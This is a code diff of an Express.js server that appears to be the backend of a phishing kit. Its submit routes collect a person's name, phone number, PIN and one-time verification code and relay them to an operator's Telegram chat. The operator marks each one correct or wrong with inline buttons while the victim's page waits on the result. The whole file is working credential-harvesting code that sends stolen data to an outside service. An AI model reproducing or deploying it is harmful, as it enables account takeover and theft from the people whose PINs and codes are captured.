@@ -1,124 +1,117 @@
 require('dotenv').config();
 const express = require('express');
-const path = require('path');
 const axios = require('axios');
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 10000;
 
-// In-memory approved pins and codes
+// Store approval states
 const approvedPins = {};
 const approvedCodes = {};
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static('public'));
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// Helper to send Telegram messages
-async function sendTelegramMessage(text, inlineKeyboard = null) {
+// ---------------- TELEGRAM HELPERS ----------------
+async function sendTelegramMessage(text, inlineKeyboard) {
     try {
-        const payload = {
-            chat_id: TELEGRAM_CHAT_ID,
-            text,
-        };
-        if (inlineKeyboard) payload.reply_markup = { inline_keyboard: inlineKeyboard };
-
-        const res = await axios.post(
+        await axios.post(
             `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-            payload
+            {
+                chat_id: TELEGRAM_CHAT_ID,
+                text,
+                reply_markup: { inline_keyboard: inlineKeyboard }
+            }
         );
-        console.log('✅ Telegram message sent:', res.data);
     } catch (err) {
-        console.error('❌ Failed to send Telegram message:', err.message);
+        console.error('Telegram error:', err.message);
     }
 }
 
-// ---------------------- Routes ----------------------
+async function answerCallback(callbackId) {
+    try {
+        await axios.post(
+            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
+            { callback_query_id: callbackId }
+        );
+    } catch (err) {
+        console.error('Callback error:', err.message);
+    }
+}
 
-// Submit PIN
+// ---------------- ROUTES ----------------
+
+// PIN submit
 app.post('/submit-pin', (req, res) => {
     const { name, phone, pin } = req.body;
-    console.log('📩 /submit-pin HIT', { name, phone, pin });
+    console.log('📩 PIN received:', pin);
 
-    approvedPins[pin] = null; // pending
+    approvedPins[pin] = null;
 
-    // Send Telegram message with buttons
-    const inlineKeyboard = [
-        [
-            { text: '✅ Correct PIN', callback_data: `correct_pin:${pin}` },
-            { text: '❌ Wrong PIN', callback_data: `wrong_pin:${pin}` }
-        ]
-    ];
-
-    const msg = `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`;
-    sendTelegramMessage(msg, inlineKeyboard);
+    sendTelegramMessage(
+        `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`,
+        [[
+            { text: '✅ Correct PIN', callback_data: `pin_ok:${pin}` },
+            { text: '❌ Wrong PIN', callback_data: `pin_bad:${pin}` }
+        ]]
+    );
 
     res.json({ status: 'pending' });
 });
 
-// Check PIN approval (front-end polling)
+// PIN check
 app.get('/check-pin/:pin', (req, res) => {
     const pin = req.params.pin;
-    const state = approvedPins[pin];
-
-    if (state === true) return res.json({ approved: true });
-    if (state === false) return res.json({ approved: false });
-    return res.json({ approved: null }); // still waiting
+    res.json({ approved: approvedPins[pin] ?? null });
 });
 
-// Submit CODE
+// CODE submit
 app.post('/submit-code', (req, res) => {
     const { name, phone, code } = req.body;
-    console.log('📩 /submit-code HIT', { name, phone, code });
+    console.log('📩 CODE received:', code);
 
-    approvedCodes[code] = null; // pending
+    approvedCodes[code] = null;
 
-    const inlineKeyboard = [
-        [
-            { text: '✅ Correct Code', callback_data: `correct_code:${code}` },
-            { text: '❌ Wrong Code', callback_data: `wrong_code:${code}` }
-        ]
-    ];
-
-    // Send Telegram message with name, phone, and code
-    const msg = `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`;
-    sendTelegramMessage(msg, inlineKeyboard);
+    sendTelegramMessage(
+        `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
+        [[
+            { text: '✅ Correct Code', callback_data: `code_ok:${code}` },
+            { text: '❌ Wrong Code', callback_data: `code_bad:${code}` }
+        ]]
+    );
 
     res.json({ status: 'pending' });
 });
 
-// Check CODE approval (front-end polling)
+// CODE check
 app.get('/check-code/:code', (req, res) => {
     const code = req.params.code;
-    const state = approvedCodes[code];
-
-    if (state === true) return res.json({ approved: true });
-    if (state === false) return res.json({ approved: false });
-    return res.json({ approved: null }); // still waiting
+    res.json({ approved: approvedCodes[code] ?? null });
 });
 
-// ---------------------- Telegram Webhook ----------------------
-app.post('/telegram-webhook', express.json(), (req, res) => {
-    console.log('📩 Telegram callback received:', JSON.stringify(req.body, null, 2));
+// TELEGRAM WEBHOOK
+app.post('/telegram-webhook', async (req, res) => {
+    const cb = req.body.callback_query;
+    if (!cb) return res.sendStatus(200);
 
-    const callback = req.body?.callback_query;
-    if (!callback) return res.sendStatus(200);
+    const [action, value] = cb.data.split(':');
 
-    const [action, value] = callback.data.split(':');
+    if (action === 'pin_ok') approvedPins[value] = true;
+    if (action === 'pin_bad') approvedPins[value] = false;
 
-    if (action === 'correct_pin') approvedPins[value] = true;
-    if (action === 'wrong_pin') approvedPins[value] = false;
+    if (action === 'code_ok') approvedCodes[value] = true;
+    if (action === 'code_bad') approvedCodes[value] = false;
 
-    if (action === 'correct_code') approvedCodes[value] = true;
-    if (action === 'wrong_code') approvedCodes[value] = false;
+    await answerCallback(cb.id);
+    console.log('✅ Telegram action:', action, value);
 
-    return res.json({ text: 'Action received' });
+    res.sendStatus(200);
 });
 
-// ---------------------- Start Server ----------------------
 app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
 });
